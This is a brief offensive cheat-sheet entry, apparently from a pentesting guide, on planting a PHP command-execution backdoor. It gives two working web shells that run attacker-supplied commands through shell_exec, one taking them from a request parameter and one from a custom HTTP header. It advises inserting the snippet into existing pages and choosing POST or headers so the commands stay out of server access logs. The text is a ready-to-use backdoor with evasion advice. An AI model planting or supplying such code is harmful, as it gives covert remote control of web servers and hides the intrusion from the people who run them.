# PHP Backdoor

This can be used for web servers that have PHP enabled. If there’s existing PHP pages, the backdoor snippet can be added to them. If not, a new PHP file can be created.

Simple command execution backdoor:

```
<?php
    if (isset($_REQUEST['cmd'])) {
        echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
    }
?>
```

A couple useful tips — with the above code you can use either GET or POST requests to send commands. With GET requests all your commands will end up in the web server’s access logs, so POST is a bit sneakier. Even more sneakier option is to pass commands through an HTTP request header, you can use the following modified snippet for that:

```
<?php
    if (isset($_SERVER['HTTP_CMD'])) {
        echo "<pre>" . shell_exec($_SERVER['HTTP_CMD']) . "</pre>";
    }
?>
```

You can do a GET (or POST) request and pass commands in a `Cmd` HTTP header.

More info: look in `/usr/share/webshells/php` on your Kali machine

